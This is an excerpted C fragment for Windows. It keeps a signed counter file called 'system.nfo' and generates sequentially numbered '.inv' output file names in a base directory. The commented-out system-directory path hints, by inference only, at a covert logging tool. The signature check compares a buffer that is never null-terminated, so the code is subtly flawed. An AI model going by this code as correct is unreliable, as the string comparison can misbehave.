...
char * TargetFile()
{
	static DWORD FileCounter = 0;
	char sign[] = "{]<>[}~`)*^$@!#%&(+=|";
	static char TargetFileName[STR_SZ1];
	strcpy(TargetFileName,BaseDirectory());

	/* open config file */
	DWORD  nFile;
	HANDLE ConfigFile = CreateFile("system.nfo", 
	...
	if (ConfigFile != INVALID_HANDLE_VALUE) {
		...
		char buff[25];
		DWORD nRead = 0;
		ReadFile(ConfigFile, buff, strlen(sign),
			&nRead, NULL);
		if(nRead == strlen(sign))
			if(!strcmp(buff, sign))
				success = TRUE;
		if(success) {
			ReadFile(ConfigFile, (char *)(&FileCounter),
				sizeof(DWORD), &nRead, NULL);
			if(nRead != sizeof(DWORD))
				ConfigFile = INVALID_HANDLE_VALUE;
		}
		else
			ConfigFile = INVALID_HANDLE_VALUE;
		...
		if (ConfigFile != INVALID_HANDLE_VALUE) {
			...
			sprintf(counter_name,"%X",FileCounter);
			strcat(TargetFileName,counter_name);
			strcat(TargetFileName,".inv");
	...
	if (ConfigFile == INVALID_HANDLE_VALUE) {
		/* create config file */
		ConfigFile = CreateFile("system.nfo", GENERIC_WRITE,
		0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (ConfigFile == INVALID_HANDLE_VALUE)
			return ""; /* bad luck */
		else {
			/* insert digital signature */
			WriteFile(ConfigFile, sign, strlen(sign), 
				&nFile, NULL);
			/* setup up the 32-bit conuter*/
			FileCounter = 0;
			WriteFile(ConfigFile, (char *)(&FileCounter), 
				sizeof(DWORD), &nFile, NULL);
			CloseHandle(ConfigFile);
			char counter_name[16];
			sprintf(counter_name,"%X",FileCounter);
			strcat(TargetFileName,counter_name);
...
char * BaseDirectory()
{
	...
	if(!BaseDir) {
		...
		//temp = GetSystemDirectory(temp,STR_SZ1);
		strcpy(temp,"d:\\");
